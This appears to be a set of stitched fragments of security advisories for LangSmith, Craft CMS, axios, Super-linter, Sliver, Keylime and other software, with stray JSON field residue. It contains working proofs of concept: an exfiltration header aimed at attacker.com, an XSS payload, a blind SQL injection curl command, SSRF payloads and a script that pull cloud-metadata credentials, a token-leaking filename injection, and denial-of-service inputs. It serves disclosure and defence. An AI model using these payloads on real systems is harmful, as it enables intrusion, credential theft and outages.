An attacker can inject arbitrary `api_url` values through the `baggage` header, causing the SDK to exfiltrate sensitive trace data to attacker-controlled endpoints.\n\n---\n\n## Description\n\nWhen using distributed tracing, the SDK parses incoming HTTP headers via `RunTree.from_headers()` in Python or `RunTree.fromHeaders()` in Typescript. The `baggage` header can contain replica configurations including `api_url` and `api_key` fields.\n\nPrior to the fix, these attacker-controlled values were accepted without validation. When a traced operation completes, the SDK's `post()` and `patch()` methods send run data to all configured replica URLs, including any injected by an attacker.\n\n---\n\n## Attack Vector\n\n1. Attacker sends an HTTP request to a vulnerable service with a malicious `baggage` header:\n   ```\n   baggage: langsmith-replicas=[{\"api_url\":\"https://attacker.com/exfil\",\"project_name\":\"x\"}]\n   ```\n\n2. The service parses the header via `RunTree.from_headers()`, storing the attacker's URL\n\n3. When the traced operation completes, the SDK sends the full run data (including LLM inputs, outputs, and metadata) to `https://attacker.com/exfil`\n\n---\n\n## Impact\n\n- **Data Exfiltration:** Sensitive trace data including LLM prompts, completions, and application metadata sent to attacker-controlled servers\n- **SSRF:** Ability to make the server send requests to arbitrary URLs, potentially targeting internal services\n\n---\n\n## Affected Use Cases\n\nApplications are vulnerable if they:\n- Use `TracingMiddleware` to automatically propagate tracing context\n- Call `RunTree.from_headers()` / `RunTree.fromHeaders()` with untrusted HTTP headers\n\n---\n\n## Remediation\n\nUpdate to the patched versions:\n- **Python:** `pip install langsmith>=0.6.3`\n- **JavaScript:** `npm install langsmith@>=0.4.6`\n\nThe fix filters incoming replica configurations to an allowlist of safe fields, removing `api_url`, `api_key`, and other credential fields.\n\n---\n\n## Workarounds\n\nIf unable to upgrade immediately:\n- Strip or validate the `baggage` header before passing to `from_headers()`\n- Do not use `TracingMiddleware` with untrusted traffic",

          "html": "## Relationship to Previously Patched Vulnerability\n\nThis vulnerability is **in addition to** the RCE vulnerability patched in [GHSA-255j-qw47-wjh5](https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5). That advisory addressed a similar RCE vulnerability that affected two specific routes:\n\n- `/index.php?p=admin%2Factions%2Ffields%2Fapply-layout-element-settings`\n- `/index.php?p=admin%2Factions%2Ffields%2Frender-card-preview`\n\nThis one addresses some additional endpoints that were not covered in the https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5.\n\nThe patched vulnerability used a malicious `AttributeTypecastBehavior` with a wildcard event listener (`\"on *\": \"self::beforeSave\"`) and `__construct()` syntax to trigger RCE via the `typecastBeforeSave` callback. The fix was implemented in commits:\n- [6e608a1](https://github.com/craftcms/cms/commit/6e608a1a5bfb36943f94f584b7548ca542a86fef)\n- [27f5588](https://github.com/craftcms/cms/commit/27f55886098b56c00ddc53b69239c9c9192252c7)\n- [ec43c49](https://github.com/craftcms/cms/commit/ec43c497edde0b2bf2e39a119cded2e55f9fe593)\n\nThis vulnerability follows the same attack pattern (behavior injection via `\"as <behavior>\"` syntax) but affects a **different code path** (`assembleLayoutFromPost()` in `Fields.php`) that was **not patched** in those commits. The attack vector uses `typecastAfterValidate` instead of `typecastBeforeSave` and does not require the wildcard event listener syntax, demonstrating that multiple entry points exist for this type of vulnerability.\n\n---\n\n## Executive Summary\n\nA Remote Code Execution (RCE) vulnerability exists in Craft CMS where the `assembleLayoutFromPost()` function in `src/services/Fields.php` fails to sanitize user-supplied configuration data before passing it to `Craft::createObject()`. This allows authenticated administrators to inject malicious Yii2 behavior configurations that execute arbitrary system commands on the server. This vulnerability represents an **unpatched variant** of the behavior injection vulnerability addressed in GHSA-255j-qw47-wjh5, affecting different endpoints through a separate code path.\n\n---\n\n## Vulnerability Details\n\n### Attack Prerequisites\n\n- **Authentication:** Admin-level access required\n- **Network Access:** Access to admin panel (`/admin`)\n\n---\n\n\n### Location\n\n- **File:** `src/services/Fields.php`\n- **Function:** `assembleLayoutFromPost()` (lines 1125-1143)\n- **Root Cause:** Missing `cleanseConfig()` call on user-supplied `fieldLayout` POST parameter\n\n### Vulnerable Code Path\n\n```php\n// src/services/Fields.php:1125-1133\npublic function assembleLayoutFromPost(?string $namespace = null): FieldLayout\n{\n    $paramPrefix = $namespace ? rtrim($namespace, '.') . '.' : '';\n    $request = Craft::$app->getRequest();\n    $config = JsonHelper::decode($request->getBodyParam(\"{$paramPrefix}fieldLayout\"));\n    // ... additional config values added ...\n    $layout = $this->createLayout($config);  // <-- No cleanseConfig() call!\n    // ...\n}\n\n// src/services/Fields.php:1089-1093\npublic function createLayout(array $config): FieldLayout\n{\n    $config['class'] = FieldLayout::class;\n    return Craft::createObject($config);  // <-- Untrusted data passed directly\n}\n```\n---\n\n## Attack Chain\n\nThe exploitation leverages Yii2's object configuration system and behavior attachment mechanism:\n\n1. **Behavior Injection:** Attacker includes `'as rce'` key in the `fieldLayout` JSON POST parameter\n2. **Object Creation:** `Craft::createObject()` processes the config through Yii2's `BaseYii::configure()`\n3. **Behavior Attachment:** Yii2's `Component::__set()` detects the `'as '` prefix and attaches the behavior\n4. **RCE Trigger:** When `validate()` is called on the model, `EVENT_AFTER_VALIDATE` fires\n5. **Command Execution:** `AttributeTypecastBehavior` calls the configured typecast function (`ConsoleProcessus::execute`) with the `uid` attribute value as the command\n\n### RCE Gadget Chain\n\n```\nFieldLayout POST parameter\n    → Craft::createObject()\n    → Yii2 Component::__set() with 'as rce' key\n    → AttributeTypecastBehavior attached\n    → Model::validate() called\n    → EVENT_AFTER_VALIDATE triggered\n    → typecastAfterValidate → typecastAttributes()\n    → call_user_func(['Psy\\Readline\\Hoa\\ConsoleProcessus', 'execute'], $command)\n    → Shell command execution\n```\n\n---\n\n## Affected Controllers\n\nThe `assembleLayoutFromPost()` function is called by multiple admin controllers:\n\n| Controller | Action | Permission Required |\n|------------|--------|---------------------|\n| `TagsController` | `actionSaveTagGroup()` | Admin |\n| `CategoriesController` | `actionSaveGroup()` | Admin |\n| `EntryTypesController` | `actionSave()` | Admin |\n| `GlobalsController` | `actionSaveSet()` | Admin |\n| `VolumesController` | `actionSave()` | Admin |\n| `UsersController` | `actionSaveUserFieldLayout()` | Admin |\n| `AddressesController` | `actionSaveAddressFieldLayout()` | Admin |\n\n---\n## References\n\n- https://github.com/craftcms/cms/commit/395c64f0b80b507be1c862a2ec942eaacb353748\n- [GHSA-255j-qw47-wjh5](https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5) - Previously patched RCE vulnerability via behavior injection (affecting different endpoints)\n- [CVE-2024-4990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4990) - Related vulnerability that inspired the behavior injection attack pattern\n- [Yii2 GHSA-gcmh-9pjj-7fp4](https://github.com/yiisoft/yii2/security/advisories/GHSA-gcmh-9pjj-7fp4) - Original Yii framework report (framework team declined to fix at framework level)\n\n---",

Log in with an admin account\n2. Navigate to **Settings** → **Fields** → **New field**\n3. Choose **Number** as the field type\n4. Set the **Prefix/Suffix Text** field to: <img width=\"611\" height=\"908\" alt=\"image\" src=\"https://github.com/user-attachments/assets/63766ca4-4fa9-490b-8bea-37364137527d\" />\n```html\n<img src=x onerror=\"alert('Number Prefix/Suffix XSS')\" hidden>\n```\n5. Save the field\n6. Add this field to any element (e.g., User Profile fields via **Settings** → **Users** → **User Fields**)\n7. Navigate to your account (`/admin/myaccount`) or any user profile (`/admin/users/{id}`)\n8. XSS executes when viewing the form <img width=\"1246\" height=\"677\" alt=\"image-1\" src=\"https://github.com/user-attachments/assets/dafeb2b7-905f-4a4b-b3d6-1c16a905498f\" />\n\n## Mitigation\nSanitize prefix/suffix before rendering or use `|e` filter instead of `|raw`.",

Log in to the control panel\n2. Navigate to any element index (e.g., **Users** `/admin/users`, **Entries**, **Assets**, etc.)\n3. Intercept the `POST` request to `/index.php?p=admin/actions/element-indexes/get-elements`\n4. Modify the JSON body to the following:\n```json\n{\"context\":\"index\",\"elementType\":\"craft\\\\elements\\\\User\",\"source\":\"*\",\"baseCriteria\":{\"siteId\":1},\"criteria\":{\"limit\":100,\"orderBy\": \"(elements.id) DESC, (SELECT SLEEP(5)) --\"},\"viewState\":{\"static\":false}}\n```\n5. Send the request\n6. Observe a delay in the response (delay = rows × sleep time)\n\nAlternatively, you can use the following `curl` (bash syntax) command (replace cookie, CSRF token, and target domain as needed):\n```bash\ncurl --path-as-is -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-CSRF-Token: <CSRF-TOKEN>' -H $'Content-Length: 208' -b $'<Cookie>' --data-binary $'{\\\"context\\\":\\\"index\\\",\\\"elementType\\\":\\\"craft\\\\\\\\elements\\\\\\\\User\\\",\\\"source\\\":\\\"*\\\",\\\"baseCriteria\\\":{\\\"siteId\\\":1},\\\"criteria\\\":{\\\"limit\\\":100,\\\"orderBy\\\": \\\"(elements.id) DESC, (SELECT SLEEP(0.2)) --\\\"},\\\"viewState\\\":{\\\"static\\\":false}}' $'http://craft.local/index.php?p=admin%2Factions%2Felement-indexes%2Fget-elements'\n```\n\n### Impact\n\nWith this Blind SQLi, an attacker can:\n- **Exfiltrate data** character-by-character.\n- **Modify or destroy data** (drop tables, update records, alter schema).\n\n### Root Cause\nThe `orderBy` parameter is not validated or sanitized.

While the implemented defense mechanisms are an improvement, I have identified two methods to bypass these protections. This report details the first bypass method involving alternative IP notation, while the second method will be submitted in a separate advisory.\n\n---\n## Summary\n\nThe `saveAsset` GraphQL mutation uses `filter_var(..., FILTER_VALIDATE_IP)` to block a specific list of IP addresses. However, alternative IP notations (hexadecimal, mixed) are not recognized by this function, allowing attackers to bypass the blocklist and access cloud metadata services.\n\n---\n## Proof of Concept\n1. Send the following GraphQL mutation:\n```graphql\nmutation {\n    save_images_Asset(_file: { \n        url: \"http://169.254.0xa9fe/latest/meta-data/\"\n        filename: \"metadata.txt\"\n    }) {\n        id\n    }\n}\n```\n2. The IP validation passes (hex notation not recognized as IP)\n3. Guzzle resolves `169.254.0xa9fe` to `169.254.169.254`\n4. Cloud metadata is fetched and saved\n\n### Alternative Payloads\n| Payload | Notation | Resolves To |\n|---------|----------|-------------|\n| `http://169.254.0xa9fe/` | Mixed (decimal + hex) | 169.254.169.254 |\n| `http://0xa9.0xfe.0xa9.0xfe/` | Full hex dotted | 169.254.169.254 |\n| `http://0xa9fea9fe/` | Single hex integer | 169.254.169.254 |\n\n---\n## Technical Details\n\n**File:** `src/gql/resolvers/mutations/Asset.php`\n**Root Cause:** `filter_var($hostname, FILTER_VALIDATE_IP)` only recognizes standard dotted-decimal notation. Hex representations bypass this check, but Guzzle still resolves them.\n\n```php\n// Line 287 - Fails to catch hex notation\nfilter_var($hostname, FILTER_VALIDATE_IP)\n```",

          "html": "### Summary\n\n- The save_images_Asset graphql mutation allows a user to give a url of an image to download.  (Url must use a domain, not a raw IP.)\n- Attacker sets up domain attacker.domain with an A record of something like 169.254.169.254 (special AWS metadata IP)\n- Attacker invokes save_images_Asset with url: http://attacker.domain/latest/meta-data/iam/security-credentials and filename \"foo.txt\"\n- Craft fetches sensitive information on attacker's behalf, and makes it available for download at /assets/images/foo.txt\n- Normal checks to verify that image is valid are bypassed because of .txt extension\n- Normal checks to verify that url is not an IP address are bypassed because user provided a valid domain that resolves to a sensitive internal IP address\n\n### Details\n\nhandleUpload() in src/gql/resolvers/mutations/Assets.php contains the code that processes the save_images_Asset mutation.\n\nIt has some basic validation logic for the url parameter (source of the image) and filename parameter (what to save image as):\n\n```\n   } elseif (!empty($fileInformation['url'])) {\n            $url = $fileInformation['url'];\n\n            // make sure the hostname is alphanumeric and not an IP address\n            $hostname = parse_url($url, PHP_URL_HOST);\n            if (\n                !filter_var($hostname, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) ||\n                filter_var($hostname, FILTER_VALIDATE_IP)\n            ) {\n                throw new UserError(\"$url contains an invalid hostname.\");\n            }\n\n            if (empty($fileInformation['filename'])) {\n                $filename = AssetsHelper::prepareAssetName(pathinfo(UrlHelper::stripQueryString($url), PATHINFO_BASENAME));\n            } else {\n                $filename = AssetsHelper::prepareAssetName($fileInformation['filename']);\n            }\n\n            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));\n            if (is_array($allowedExtensions) && !in_array($extension, $allowedExtensions, true)) {\n                throw new AssetDisallowedExtensionException(Craft::t('app', \"“{$extension}” is not an allowed file extension.\"));\n            }\n```\n\nThe upshot of this validation is that url must contain a hostname, not an IP, and filename must contain an allowed extension.  If the allowed extension is a typical image extension, further validation will be done downstream  to verify that the downloaded content is in fact an image.\n\nAn authenticated attacker can trick this mutation into fetching sensitive AWS metadata, or other sensitive information from the craft instance's internal network.\n\n- First, the attacker must register a domain -- e.g. attacker.domain.  \n- Next, they must point their domain at the sensitive internal ip they'd like to access (e.g. 169.254.169.254)\n- Next, they make a request to save_images_Asset with url set to http://attacker.domain/sensitive/path with filename set to \"something.txt\"\n- Finally the attacker makes a http request to retrieve /assets/images/something.txt, which contains sensitive information\n\n\n### PoC\n\n#### Preconditions\n\n- Graphql access must be enabled\n- Attacker must have access to a graphql token\n- Token must be configured to have access to save_images_Asset mutation\n- Attacker must have configured a domain, \"attacker.domain\" pointing to the sensitive internal IP address they'd like to access\n- .txt must be an allowed extension for uploads via save_images_Asset (as it is by default)\n\n#### Code\n\n```\nimport requests\n\n# Replace GRAPHQL_ENDPOINT and BEARER_TOKEN per target.\nGRAPHQL_ENDPOINT = 'http://localhost:8080/actions/graphql/api'\nTOKEN = '<TOKEN HERE>'\n\nmutation = '''\nmutation SaveAsset($_file: FileInput!, $title: String, $focalPoint: String) { save_images_Asset(_file: $_file,\n   title: $title, focalPoint: $focalPoint) { id title url filename focalPoint dateCreated } }\n'''\n\nvariables = {\n  '_file': {\n    'url' : \"http://attacker.domain/latest/meta-data/iam/security-credentials\",\n    'filename': 'foo.txt'\n\n  },\n  \"title\": \"my photo\",\n  \"focalPoint\": \"0.5;0.5\"\n\n}\n\nresp = requests.post(GRAPHQL_ENDPOINT,\n                     json={'query': mutation, 'variables': variables},\n                     headers={'Authorization': f'Bearer {TOKEN}'})\nprint(resp.status_code, resp.text)\n```\n\nIf attack is successful, response to running this script will be something like:\n\n```\n200 {\"data\":{\"save_images_Asset\":{\"id\":\"211403\",\"title\":\"my photo\",\"url\":\"http://localhost:8080/assets/volumes/images/foo.txt\",\"filename\":\"foo.txt\",\"focalPoint\":null,\"dateCreated\":\"2025-12-18T09:45:24-08:00\"}}}\n```\n\nAttacker can then download sensitive data by fetching http://localhost:8080/assets/volumes/images/foo.txt\n\n\n### Impact\n\nImpacted users must:\n\n- Have graphql enabled\n- Have a graphql token created with permissions to use save_images_Asset\n- Have graphql token stolen by attacker or abused by malicious insider\n\nImpact is heightened if:\n\n- craft is running on something like an AWS EC2 instance, which has a well-known, sensitive internal http address that can be accessed to fetch metadata.  \n\nUltimate result is:\n\nAttacker or malicious insider gets access to infrastructure craft is running on, not just craft itself.",

When this action is used in downstream GitHub Actions workflows, an attacker can submit a pull request that introduces a file whose **name** contains shell command substitution syntax, such as `$(...)`. In affected Super-linter versions, runtime scripts may execute the embedded command during file discovery processing, enabling arbitrary command execution in the workflow runner context. This can be used to disclose the job’s `GITHUB_TOKEN` depending on how the workflow configures permissions.\n\n### Details\n\nThe issue appears originates in the logic that scans the repository for changed files to check.\n\n1. Use a workflow that runs Super-linter on `pull_request` events.\n2. Open a pull request that adds a new file with a crafted filename containing command substitution and an outbound request that includes `$GITHUB_TOKEN`.\n3. Run the workflow.  \n\n### Impact\n\n- **Arbitrary command execution** in the context of the workflow run that invokes Super-linter (triggered by attacker-controlled filenames in a PR).\n- **Credential exposure / misuse:** the injected command can read environment variables available to the action, including `GITHUB_TOKEN`.\n\nThe level of exposure depends on the source of the pull request.\n\nTo actively exploit the vulnerability, an attacker needs have the ability to run workflows without any [approval from the repository admin](https://docs.github.com/en/actions/how-tos/manage-workflow-runs/approve-runs-from-forks).\n\nAlso, the `GITHUB_TOKEN` needs to have unconstrained access to repository resources. Even in that case, for pull request coming from forked repositories, no secrets are passed to the forked repository when running workflows triggered by `pull_request` events, and the `GITHUB_TOKEN` drops and write permission on the source repository [source](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflows-in-forked-repositories).\n\nFinally, although not specific to this vulnerability, we recommend auditing `workflow_call` and `pull_request_target` workflows because they can lead to compromise, regardless of whether you're using Super-linter, or not, as [explained by this GitHub Enterprise doc](https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/secure-use#mitigating-the-risks-of-untrusted-code-checkout).",

An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\"timeout\": 5000}` | SUCCESS |\n| Malicious config | `JSON.parse('{\"__proto__\": {\"x\": 1}}')` | **CRASH** |\n| Nested object | `{\"headers\": {\"X-Test\": \"value\"}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\"__proto__\": {\"x\": 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable.

Specifically, outbound traffic using the `sendto`, `sendmsg`, and `sendmmsg` socket system calls can bypass detection and logging when using `egress-policy: audit`. \n\n**Note:** This vulnerability only affects audit mode. When using `egress-policy: block`, these connections are properly blocked. It requires the attacker to already have code execution capabilities within the GitHub Actions workflow (e.g., through workflow injection or compromised dependencies)\n\n## Affected Versions \n\n- Harden-Runner Community Tier: All versions prior to v2.14.2 \n- Harden-Runner Enterprise Tier: **NOT AFFECTED** \n\n## Severity \n\n**Medium** - This vulnerability affects audit logging capabilities but requires the attacker to already have code execution within the workflow. \n\n## Impact \n\nWhen Harden-Runner is configured in audit mode (`egress-policy: audit`), attackers with the ability to execute arbitrary code in a workflow can: \n- Send outbound network traffic without generating audit logs \n- Bypass network monitoring for UDP-based communications \n\n**Important:** This vulnerability requires the attacker to already have code execution capabilities within the GitHub Actions workflow (e.g., through workflow injection or compromised dependencies). \n\n## Technical Details \n\nThe vulnerability stems from incomplete monitoring coverage of certain socket-related system calls. Specifically, the following system calls can be used to send UDP traffic without triggering audit events: \n\n- `sendto()` \n\n- `sendmsg()` \n\n- `sendmmsg()` \n\nAn attacker with code execution in a workflow can compile and execute native code that uses these system calls to establish covert communication channels. \n\n## Affected Users \n\n**This vulnerability ONLY affects users of the Harden-Runner Community Tier.** \n\nThe Harden-Runner Enterprise Tier is **NOT vulnerable** to this bypass technique. \n\n## Remediation \n\n### For Community Tier Users \n \n**Upgrade to Harden-Runner v2.14.2 or later.** This version includes fixes for the logging bypass vulnerability. \n\n### For Enterprise Tier Users \n\nNo action required. Enterprise tier customers are not affected by this vulnerability. \n\n## Credit \n\nWe would like to thank [Devansh Batham](https://github.com/devanshbatham) for responsibly disclosing this vulnerability through our security reporting process. Devansh was communicative throughout the process and verified the fix before the fix before it was made public.",

          "html": "Fiber v2 contains an internal vendored copy of `gofiber/utils`, and its functions `UUIDv4()` and `UUID()` inherit the same critical weakness described in the upstream advisory. On **Go versions prior to 1.24**, the underlying `crypto/rand` implementation **can return an error** if secure randomness cannot be obtained. In such cases, these Fiber v2 UUID functions silently fall back to generating predictable values — the all-zero UUID `00000000-0000-0000-0000-000000000000`.\n\nOn Go **1.24+**, the language guarantees that `crypto/rand` no longer returns an error (it will block or panic instead), so this vulnerability primarily affects **Fiber v2 users running Go 1.23 or earlier**, which Fiber v2 officially supports.\n\nBecause no error is returned by the Fiber v2 UUID functions, application code may unknowingly rely on *predictable, repeated, or low-entropy identifiers* in security-critical pathways. This is especially impactful because many Fiber v2 middleware components (session middleware, CSRF, rate limiting, request-ID generation, etc.) **default to using `utils.UUIDv4()`**.\n\nImpact includes, but is not limited to:\n\n* **Session fixation or hijacking** (predictable session IDs)\n* **CSRF token forgery** or bypass\n* **Authentication replay / token prediction**\n* **Potential denial-of-service (DoS):** if the zero UUID is generated, key-based structures (sessions, rate-limits, caches, CSRF stores) may collapse into a single shared key, causing overwrites, lock contention, or state corruption\n* **Request-ID collisions**, undermining logging and trace integrity\n* **General compromise** of confidentiality, integrity, and authorization logic relying on UUIDs for uniqueness or secrecy\n\nAll Fiber v2 versions containing the internal `utils.UUIDv4()` / `utils.UUID()` implementation are affected when running on **Go <1.24**. **No patched Fiber v2 release currently exists.**\n\n---\n\n## Suggested Mitigations / Workarounds\n\nUpdate to the latest version of Fiber v2.\n\n---\n\n### Likelihood / Environmental Factors\n\nIt’s important to note that **entropy exhaustion on modern Linux systems is extremely rare**, as the kernel’s CSPRNG is resilient and non-blocking. However, **entropy-source failures** — where `crypto/rand` cannot read from its underlying provider — are significantly more likely in certain environments.\n\nThis includes containerized deployments, restricted sandboxes, misconfigured systems lacking read access to `/dev/urandom` or platform-equivalent sources, chrooted or jailed environments, embedded devices, or systems with non-standard or degraded randomness providers. On **Go <1.24**, such failures cause `crypto/rand` to return an error, which the Fiber v2 UUID functions currently treat as a signal to silently generate predictable UUIDs, including the zero UUID. This silent fallback is the root cause of the vulnerability.\n\n---\n\n## References\n\n* Upstream advisory for `gofiber/utils`: **GHSA-m98w-cqp3-qcqr**\n* Source repositories:\n\n  * `github.com/gofiber/fiber`\n  * `github.com/gofiber/utils`\n\n---\n\n## Credits / Reporter\n\nReported by **@sixcolors** (Fiber Maintainer / Security Team)",

Because sessions are stored without a cleanup/expiry path in this flow, an unauthenticated remote actor can repeatedly create sessions and drive memory exhaustion.\n\n## Vulnerable Component\n- `server/c2/dns.go:84-90` (`EnforceOTP` stored but not enforced in bootstrap)\n- `server/c2/dns.go:378-390` (`TOTP` requests routed directly to bootstrap)\n- `server/c2/dns.go:490-521` (`handleHello` allocates session without OTP validation)\n- `server/c2/dns.go:495` (`sessions.Store` with no lifecycle control in this path)\n- `client/command/jobs/dns.go:46-52` (operator-facing `EnforceOTP` control implies auth gate)\n- `implant/sliver/transports/dnsclient/dnsclient.go:896-900` (`otpMsg` sends `TOTP` with `ID=0`)\n- `protobuf/dnspb/dns.proto:22` (documents TOTP in `ID` field)\n\n## Attack Vector\n- Network-accessible DNS listener\n- No authentication required\n- Low-complexity repeated DNS query loop\n- Trigger path: `DNSMessageType_TOTP` bootstrap handling\n\n## Proof of Concept\n### Preconditions\n- DNS listener is reachable\n- DNS C2 job is active\n\n### Reproduction Steps\n1. Send repeated DNS queries with a minimal protobuf message of type `TOTP`.\n2. Observe repeated session allocation/issuance behavior.\n3. Continue requests to increase active in-memory session state.\n\n### Example\n```bash\nwhile true; do\n  dig +short @<DNS_C2_IP> baa8.<parent-domain> A >/dev/null\ndone\n```\n\n`baa8` is a base32 payload for a minimal TOTP-type protobuf message.\n\n### Observable Indicators\n- Repeated bootstrap/session-allocation log entries from `handleHello`\n- Rising memory usage in the Sliver server process\n- Service slowdown or instability under sustained request volume\n\n## Impact\n- Unauthenticated remote denial of service (availability)\n- Resource exhaustion through unbounded session growth in DNS bootstrap path\n- Estimated CVSS v3.1: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (**7.5 High**)",

Traffic that should be denied by the configured Antrea NetworkPolicies may end up being allowed, potentially letting an attacker access a sensitive service. Traffic that should be allowed by the configured Antrea NetworkPolicies may end up being denied, breaking applications and potentially opening the door for denial-of-service attacks.\n\nThe Antrea NetworkPolicy system comes with support for priority Tiers.

The registrar's TLS context is configured with `ssl.CERT_OPTIONAL` instead of `ssl.CERT_REQUIRED`, allowing any client to connect to protected API endpoints without presenting a valid client certificate.\n\n**Who is impacted:**\n  - All Keylime deployments running versions 7.12.0 through 7.13.0\n  - Environments where the registrar HTTPS port (default 8891) is network-accessible to untrusted clients\n\n**What an attacker can do:**\n  - **List all registered agents** (`GET /v2/agents/`) - enumerate the entire agent inventory\n  - **Retrieve agent details** (`GET /v2/agents/{uuid}`) - obtain public TPM keys, certificates, and network locations (IP/port) of any agent\n  - **Delete any agent** (`DELETE /v2/agents/{uuid}`) - remove agents from the registry, disrupting attestation services\n\nNote: The exposed TPM data (EK, AK, certificates) consists of public keys and certificates. Private keys remain protected within TPM hardware. The HMAC secret used for challenge-response validation is stored in the database but is not exposed via the API.\n\n**Affected versions:** >= 7.12.0, <= 7.13.0\n\n**Fixed versions:** 7.12.2, >= 7.13.1\n\n### Patches\n\nA patch for the affected released versions is available. It removes the line that override the configuration of `ssl.verify_mode`, leaving the `CERT_REQUIRED` value set by `web_util.init_mtls()`:\n\n```diff\ndiff --git a/keylime/web/base/server.py b/keylime/web/base/server.py\nindex 1d9a9c2..859b23a 100644\n--- a/keylime/web/base/server.py\n+++ b/keylime/web/base/server.py\n@@ -2,7 +2,6 @@ import asyncio\n import multiprocessing\n from abc import ABC, abstractmethod\n from functools import wraps\n-from ssl import CERT_OPTIONAL\n from typing import TYPE_CHECKING, Any, Callable, Optional\n\n import tornado\n@@ -252,7 +251,6 @@ class Server(ABC):\n         self._https_port = config.getint(component, \"tls_port\", fallback=0)\n         self._max_upload_size = config.getint(component, \"max_upload_size\", fallback=104857600)\n         self._ssl_ctx = web_util.init_mtls(component)\n-        self._ssl_ctx.verify_mode = CERT_OPTIONAL\n\n     def _get(self, pattern: str, controller: type[\"Controller\"], action: str, allow_insecure: bool = False) -> None:\n         \"\"\"Creates a new route to handle incoming GET requests issued for paths which match the given\n```\n\nUsers should upgrade to the patched version once it is released.\n\n### Workarounds\n\nIf upgrading is not immediately possible, apply one of the following mitigations:\n\n#### 1. Network isolation (Recommended)\n\nRestrict access to the registrar HTTPS port (default 8891) using firewall rules\nto allow only trusted hosts (verifier, tenant):\n\n##### Example using iptables\n```\niptables -A INPUT -p tcp --dport 8891 -s <verifier_ip> -j ACCEPT\niptables -A INPUT -p tcp --dport 8891 -s <tenant_ip> -j ACCEPT\niptables -A INPUT -p tcp --dport 8891 -j DROP\n```\n\n#### 2. Reverse proxy with mTLS enforcement\n\nDeploy a reverse proxy (nginx, HAProxy) in front of the registrar that enforces client certificate authentication:\n\n##### Example nginx configuration\n```\nserver {\n    listen 8891 ssl;\n    ssl_certificate /path/to/server.crt;\n    ssl_certificate_key /path/to/server.key;\n    ssl_client_certificate /path/to/ca.crt;\n    ssl_verify_client on;  # Enforce client certificates\n\n    location / {\n        proxy_pass https://localhost:8892;  # Internal registrar port\n    }\n}\n```",

If an attacker were able to make requests to a SpiceDB instance, they could affect its availability.\n\n## Reproduction\nIf one was to take a cursor from a LookupResources call, decode it according to the logic that SpiceDB uses, and modify the Sections field to include an invalid relationship string, the process will panic.\n\n## Impact\nAn attacker would need both the ability to create a gRPC connection to your SpiceDB instance and a valid token, or else the ability to pass a cursor token from outside your application through to your SpiceDB instance.\n\nIf an attacker had this ability, they could bring down SpiceDB instances, reducing the availability of SpiceDB and any service that depends on it.\n\n## Mechanism\nThe SpiceDB process does not validate the contents of this `Sections` component of the `Cursor` message. In affected versions, it uses a parsing function that calls `panic` if the value cannot be parsed as a relationship. \n\n## Fix\nThis issue was fixed in https://github.com/authzed/spicedb/pull/2878.\n\n## Remediations\n* Prevent client control of the `optional_cursor` field in `LookupResources` calls\n* Upgrade to an unaffected version",

When processing file uploads, the multipart parser may accumulate an unbounded amount of data in memory while attempting to detect file types, potentially leading to excessive memory consumption and process termination.\n\nThis issue affects applications that accept `multipart/form-data` uploads using affected versions of `@adonisjs/bodyparser`.\n\n### Details\n\nAdonisJS parses `multipart/form-data` requests using the BodyParser package. During file uploads, the multipart parser attempts to detect the uploaded file type by accumulating incoming chunks in an internal buffer to perform magic number detection.\n\nThe internal buffer used for this detection does not enforce a maximum size and is not protected by a timeout or early termination condition. If the uploaded data does not match any supported file signatures, the buffer continues to grow as more chunks are received.\n\nWhen certain configurations are used, such as deferred validations or permissive file size limits, this buffering behavior may persist for the duration of the upload stream.\n\n### Impact\n\nExploitation requires a reachable endpoint that accepts multipart file uploads.\n\nAn attacker can send a specially crafted multipart request containing a large or unbounded stream of data that does not match known file signatures. This may cause the server to continuously allocate 